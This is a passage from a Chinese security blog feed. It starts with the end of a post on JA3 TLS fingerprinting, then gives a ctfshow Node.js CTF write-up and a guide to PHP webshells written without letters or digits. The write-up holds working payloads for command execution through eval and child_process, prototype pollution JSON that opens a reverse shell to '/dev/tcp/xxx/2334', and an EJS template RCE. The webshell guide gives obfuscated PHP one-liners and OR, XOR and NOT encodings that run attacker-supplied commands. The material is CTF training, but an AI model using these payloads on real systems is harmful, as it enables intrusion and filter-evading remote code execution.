<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>至于怎么去修改Extensions Type,Supported Groups,Elliptic curves point formats来进行修改ja3指纹，我就不太清楚了<br>之前在stackoverflow上面问了一个跟我有同样疑惑的网友，问他现在解决没有，但是评论不知道为什么被系统秒删了，我也就没去进行深究了<br><a href="https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540">https://stackoverflow.com/questions/69982651/tls-adapter-for-extentions-with-python3-requests/74032540#74032540</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/">https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967/</a></li>
<li><a href="https://www.cnblogs.com/theseventhson/p/14613527.html">https://www.cnblogs.com/theseventhson/p/14613527.html</a></li>
<li><a href="https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul">https://stackoverflow.com/questions/40373115/how-to-select-specific-the-cipher-while-sending-request-via-python-request-modul</a></li>
<li><a href="https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html">https://urllib3.readthedocs.io/en/stable/reference/urllib3.poolmanager.html</a></li>
</ul>
]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-nodejs</title>
    <url>/2022/11/28/ctfshow-nodejs/</url>
    <content><![CDATA[<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">constructor.prototype==__proto__</span><br></pre></td></tr></table></figure>
<h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><span id="more"></span>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看到前面<br><code>name!==&#39;CTFSHOW&#39;</code><br>后面<br><code>item.username === name.toUpperCase</code><br>那么直接输入小写ctfshow和123456即可绕过</p>
<blockquote>
<p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p>
</blockquote>
<h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>查看源码，知道参数/?eval=<br>传入参数<br><code>eval=require(&#39;child_process&#39;).exec(&#39;id&#39;);</code><br><img src="/2022/11/28/ctfshow-nodejs/1.jpg" alt><br>可以看到是object Object 无回显<br>因为exec返回的是 ChildProcess<br><a href="http://nodejs.cn/api/child_process.html">http://nodejs.cn/api/child_process.html</a><br>查看文档可以替换成如下函数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">命令执行</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">output</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;cat&#x27;</span>,[<span class="string">&#x27;fl00g.txt&#x27;</span>]).<span class="property">stdout</span>;</span><br><span class="line">?<span class="built_in">eval</span>=<span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">文件操作</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readdirSync</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">?<span class="built_in">eval</span>=<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>传入<br><code>require(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()</code><br><code>require(&#39;child_process&#39;).exec(&#39;ls /&#39;)</code><br>均回显tql，盲猜过滤了exec<br>使用<br><code>require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[]).output;</code><br><code>require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).output;</code><br>或者web335的读文件操作</p>
<h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>类似于php的传输入<br>payload: <code>/?a[x]=1&amp;b[x]=1</code></p>
<h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>原型链污染：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript</a><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>看到copy这个函数的实现，可以想到原型链污染<br>根据app.js的路由，知道是routes/login.js这个文件<br>那么只需要抓取登录包，把post内容改为<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code><br>即可获取flag</p>
<h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><blockquote>
<p>在做之前调试了一下nodejs，发现原型链污染完以后，在下次那个被污染的还是被污染，并不会在下次访问的时候就变成未被污染的状态</p>
</blockquote>
<h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>只要把query进行变量覆盖，就可以进行任意命令执行</p>
<blockquote>
<p><strong>注意这里是大写Function，是一个构造器，可以把这里分解为两步看</strong><br><img src="/2022/11/28/ctfshow-nodejs/2.jpg" alt></p>
</blockquote>
<p>用如下payload访问login页面<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code><br>成功将query进行覆盖，再去访问api那个页面，就会反弹shell</p>
<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>主要是一个ejsRCE，参考链接：<a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/</a><br><code>&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
<h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>
<p>因为这次是复制user.userinfo的对象，所以需要两层<strong>proto</strong>，才能污染到最顶端的值，也就是<br><code>&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/2334 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></p>
<h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>使用ejsRCE进行反弹shell，但是这次render点在index.js<br>所以对login进行了原型链污染以后，需要在访问一次index.js才能反弹shell</p>
<h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342   web343"></a>web342   web343</h2><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br>可以根据这篇文章进行调试<br>核心就是找到可覆盖点（可插入到模板中，且为undefined）</p>
<blockquote>
<p><strong>为什么要undefined</strong><br>因为只有在某个对象他没有定义这个变量的时候才会向上的prototype去寻找，否则就算污染了原型链也是没法利用的</p>
</blockquote>
<p>注意这里的payload要用execSync，不能用exec</p>
<h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>这题关键是多个相同的参数传递过去，nodejs会将其拼接为列表的形式<br><img src="/2022/11/28/ctfshow-nodejs/3.jpg" alt><br><img src="/2022/11/28/ctfshow-nodejs/4.jpg" alt><br>这里传参的时候要把payload复制到burp里面，如果浏览器直接访问，会出一些编码错误<br>payload<br><code>query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125;</code></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>nodejs</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell-奇淫技巧（php）</title>
    <url>/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/</url>
    <content><![CDATA[<h2 id="无数字字母获取所有数字"><a href="#无数字字母获取所有数字" class="headerlink" title="无数字字母获取所有数字"></a>无数字字母获取所有数字</h2><p>通过boolean类型进行加减<br><span id="more"></span><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="literal">true</span>+<span class="literal">true</span>) == <span class="number">2</span>);         <span class="comment">// D:\phpstudy_pro\WWW\a.php:2:boolean true</span></span><br></pre></td></tr></table></figure><br>从两个真相加得到了2，那么布尔类型的都应该都可以进行加减<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 单引号</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义变量</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 未定义常量</span></span><br><span class="line"><span class="variable">$_</span> = _==_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 中括号</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>+<span class="variable">$_</span>;                         <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 获取0</span></span><br><span class="line"><span class="variable">$_</span> = []==[];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>-<span class="variable">$_</span>;                         <span class="comment">// 0</span></span><br><span class="line"><span class="comment">// 获取false</span></span><br><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_</span>);                       <span class="comment">// D:\phpstudy_pro\WWW\a.php:3:boolean false</span></span><br></pre></td></tr></table></figure><br>总而言之就是拿着两个类型去比较，当然也可以用大于号小于号之类的去比较<br>当然有时候未定义的变量、常量，也可以当作false来用<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;kaikaix&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$b</span>];                        <span class="comment">//输出 k</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[_];                         <span class="comment">//输出 k</span></span><br></pre></td></tr></table></figure></p>
<h2 id="无数字字母获取所有的字母"><a href="#无数字字母获取所有的字母" class="headerlink" title="无数字字母获取所有的字母"></a>无数字字母获取所有的字母</h2><h3 id="数组拼接"><a href="#数组拼接" class="headerlink" title="数组拼接"></a>数组拼接</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = <span class="string">&#x27;&#x27;</span>.[];                         <span class="comment">//字符串与数组拼接变成Array</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;_&#x27;</span>];                  <span class="comment">//false代表0，这里取到A</span></span><br><span class="line"><span class="variable">$___</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)+(<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>);  <span class="comment">//3个true相加为3</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>[<span class="variable">$___</span>];                     <span class="comment">//获取到a</span></span><br></pre></td></tr></table></figure>
<p>剩下的操作就是一些自加操作了，这样就可以获取到所有的字母了<br>在php中字母是可以自加的（不能自减），但是特殊字符不行<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//变成b</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//还是(</span></span><br></pre></td></tr></table></figure><br>这里我突发奇想，想看看class类型能不能拼接出Object字符串，null能不能拼接出字符串null，然而并不行，那么就只能先告一段落</p>
<h3 id="利用数学错误"><a href="#利用数学错误" class="headerlink" title="利用数学错误"></a>利用数学错误</h3><p>php中0/0会返回NAN，1/0会返回INF<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//false/false 报错 NAN</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串NAN</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印出 NAN</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1/0</span></span><br><span class="line"><span class="variable">$_</span> = (<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;&#x27;</span>)/(<span class="string">&#x27;&#x27;</span>!=<span class="string">&#x27;&#x27;</span>);             <span class="comment">//true/false报错 INF</span></span><br><span class="line"><span class="variable">$_</span> .= <span class="string">&#x27;&#x27;</span>;                           <span class="comment">//将报错与字符串拼接，转换为字符串INF</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//打印INF</span></span><br></pre></td></tr></table></figure><br>当然上面的代码还是有点长的，可以用undefined的常量或变量相除，就会缩短代码长度<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//常量</span></span><br><span class="line"><span class="variable">$_</span>=_/_;</span><br><span class="line"><span class="variable">$_</span>.=_;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"><span class="comment">//缩短代码</span></span><br><span class="line"><span class="variable">$_</span>=(_/_._);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN_</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//变量</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="variable">$_</span>/<span class="variable">$_</span>.<span class="variable">$_</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_</span>;                            <span class="comment">//输出NAN</span></span><br></pre></td></tr></table></figure><br>这样可以获取到NAN的字符串，那么提取第一个也就是N<br>因为POST这几个字母都在N后面，那么进行一些自加操作就可以获取到$_POST了，我这里抄一下别的师傅的代码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=(_/_._)[<span class="number">0</span>];                      <span class="comment">//直接拼接成字符串并切片</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>;                            <span class="comment">//$o=++$a是先把$a进行自增，自增完成之后再将值返回，也就是这一句结束的时候 $a和$o都是O</span></span><br><span class="line"><span class="variable">$o</span>=++<span class="variable">$a</span>.<span class="variable">$o</span>;                         <span class="comment">//$o=&gt;PO,$a=&gt;P</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//Q</span></span><br><span class="line"><span class="variable">$a</span>++;                               <span class="comment">//R</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POS,$a=&gt;S</span></span><br><span class="line"><span class="variable">$o</span>.=++<span class="variable">$a</span>;                           <span class="comment">//$o=&gt;POST,$a=&gt;T</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$o</span>;                            <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[<span class="number">0</span>](<span class="variable">$$_</span>[_]);                     <span class="comment">//$_POST[0]($_POST[_]);</span></span><br></pre></td></tr></table></figure><br>在这里的变量名称最后替换成特殊字符就可以了<br>比如下图这些<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/1.jpg" alt><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$Ñ</span> = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$Ñ</span>;</span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=(_/_._)[0];$%fe=%2b%2b$%ff;$%fe=%2b%2b$%ff.$%fe;$%ff%2b%2b;$%ff%2b%2b;$%fe.=%2b%2b$%ff;$%fe.=%2b%2b$%ff;$_=_.$%fe;$$_[0]($$_[_]);&amp;0=system&amp;_=cat /f1agaaa</code></p>
<h3 id="gettext"><a href="#gettext" class="headerlink" title="gettext"></a>gettext</h3><p>当php安装了gettext扩展，这个扩展中_()相当于gettext()<br>相关文档 <a href="https://www.php.net/manual/en/book.gettext.php">https://www.php.net/manual/en/book.gettext.php</a><br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];                       <span class="comment">//获取到N</span></span><br></pre></td></tr></table></figure><br>最后一些自加的顺序操作可以让你的webshell更短，但是这里就不细说了，因为我感觉有点没必要<br>可以参考这篇文章的底部<br><a href="https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah">https://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah</a><br>直接上代码<br>72位字符<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">_</span>(a/a)[a];<span class="comment">//N</span></span><br><span class="line">++<span class="variable">$a</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$a</span>.<span class="variable">$a</span>++;<span class="comment">//PO</span></span><br><span class="line"><span class="variable">$a</span>++;<span class="variable">$a</span>++;<span class="comment">//R</span></span><br><span class="line"><span class="variable">$_</span>=_.<span class="variable">$_</span>.++<span class="variable">$a</span>.++<span class="variable">$a</span>;<span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$$_</span>[a](<span class="variable">$$_</span>[_]);<span class="comment">//$_POST[a]($_POST[_])</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$%ff=_(%ff/%ff)[%ff];%2b%2b$%ff;$_=$%ff.$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$_=_.$_.%2b%2b$%ff.%2b%2b$%ff;$$_[%ff]($$_[_]);&amp;%ff=system&amp;_=cat /f1agaaa</code></p>
<p>68位字符<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="title function_ invoke__">_</span>(a/a)[_];<span class="comment">//N</span></span><br><span class="line"><span class="variable">$a</span>=++<span class="variable">$_</span>;<span class="comment">//O</span></span><br><span class="line"><span class="variable">$$a</span>[<span class="variable">$a</span>=_.++<span class="variable">$_</span>.<span class="variable">$a</span>[<span class="variable">$_</span>++/<span class="variable">$_</span>++].++<span class="variable">$_</span>.++<span class="variable">$_</span>](<span class="variable">$$a</span>[_]);<span class="comment">//巧妙的把两次$_++放在一起</span></span><br></pre></td></tr></table></figure><br>payload<br><code>ctf_show=$_=_(%ff/%ff)[_];$%ff=%2b%2b$_;$$%ff[$%ff=_.%2b%2b$_.$%ff[$_%2b%2b/$_%2b%2b].%2b%2b$_.%2b%2b$_]($$%ff[_]);&amp;_POST=system&amp;_=cat /f1agaaa</code></p>
<h3 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h3><p>具体参考p神文章<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;ls&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure><br>核心原理就是上传的文件会临时保存到/tmp/phpXXXXXX中，后面的X是随机字符<br>[@-[]这个代表?是从@-[，也就是所有的大写字母<br>那么命令执行就可以去执行这个临时文件</p>
<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><h3 id="或"><a href="#或" class="headerlink" title="或"></a>或</h3><p>主要是通过特殊字符进行异或运算得到正常字符<br>比如<br><code>(&quot;%10%08%10%09%0e%06%0f&quot;|&quot;%60%60%60%60%60%60%60&quot;)()</code><br>运算完以后就是<br><code>phpinfo()</code><br>这里有相关的代码<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E6%88%96</a><br>当然双引号可以替换为单引号<br>如果是直接复制到php文件中去执行的话需要先url decode才行<br><code>(&quot;    &quot;|&quot;```````&quot;)();</code></p>
<h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或与或的原理类似<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%BC%82%E6%88%96</a></p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>这里用的yu22x的脚本<br><a href="https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D">https://github.com/kaikaix/ctf/tree/main/phpshell/%E5%8F%96%E5%8F%8D</a><br>这里是用php命令行去执行<br><img src="/2022/11/29/webshell-%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%EF%BC%88php%EF%BC%89/2.jpg" alt><br>如果没有参数可以把后面括号里面的东西删除<br><code>(~%8F%97%8F%96%91%99%90)();</code><br>同理，如果想在php中执行，也要先urldecode</p>
